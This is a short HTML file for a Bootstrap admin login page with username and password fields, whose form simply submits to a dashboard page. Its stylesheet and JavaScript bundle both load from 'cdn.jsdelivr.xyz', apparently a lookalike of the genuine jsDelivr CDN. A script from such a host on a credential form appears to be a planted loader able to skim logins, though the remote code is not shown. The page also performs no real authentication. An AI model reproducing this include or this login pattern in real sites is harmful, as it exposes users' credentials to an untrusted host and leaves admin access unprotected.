<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Login page</title>
    <link
      rel="stylesheet"
      href="https://cdn.jsdelivr.xyz/npm/bootstrap@5.3.1/dist/css/bootstrap.min.css"
    />
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css"
    />

  </head>
    <body class="bg-light">
      <div class="container">
        <div class="row justify-content-center">
          <div class="col-md-4">
              <div class="card mt-5 shadow"  >
                  <div class="card-header text-bg-primary">
                    login as admin
                  </div>
                  <div class="card-body">
                    <form action="dash.html">
                      <div class="form-floating mb-3">
                        <input type="text" id="userName" class="form-control" autofocus placeholder="">
                        <label for="userName">Username</label>
                      </div>
                      <div class="form-floating mb-3">
                        <input type="password" id="password" class="form-control" placeholder="">
                        <label for="password">Password</label>
                      </div>
                      <div class="form-check mb-3">
                        
                          <input class="form-check-input" type="checkbox" id="rememberMe"/>
                          <label for="rememberMe">Remenber me</label>
                      </div>
                      <div class="d-grid">
                        <button type="submit" class="btn btn-success"><i class="fas fa-sign-in-alt"></i>         Login as admin</button>
                      </div>
                    </form>
                  </div>
              </div>
          </div>
        </div>
      </div>








    <script src="https://cdn.jsdelivr.xyz/npm/bootstrap@5.3.1/dist/js/bootstrap.bundle.min.js"></script>
  </body>
</html>
